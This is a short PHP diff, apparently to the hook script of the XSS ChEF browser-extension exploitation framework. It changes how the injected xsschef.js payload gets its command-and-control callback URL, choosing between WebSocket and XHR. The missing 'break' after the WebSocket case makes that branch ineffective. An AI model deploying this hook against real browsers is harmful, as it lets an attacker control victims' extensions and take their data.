@@ -18,7 +18,13 @@
 */
 $script = file_get_contents('xsschef.js');
 $port = !empty($_GET['port']) ? (int) $_GET['port'] : 8080;
-$url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . $_SERVER['HTTP_HOST'] . ':8080/chef'; 
+switch ($_GET['server_type']) {
+    case 'ws':
+        $url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . preg_replace('/\:.*/', '', $_SERVER['HTTP_HOST']) . ':' . $port . '/chef'; 
+    case 'xhr':
+    default:
+        $url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/hook.php', '/server.php', $_SERVER['SCRIPT_NAME']);
+}
 
 $ch = 'c'.crc32(rand() . time());
 $script = str_replace('__URL__', $url, $script);
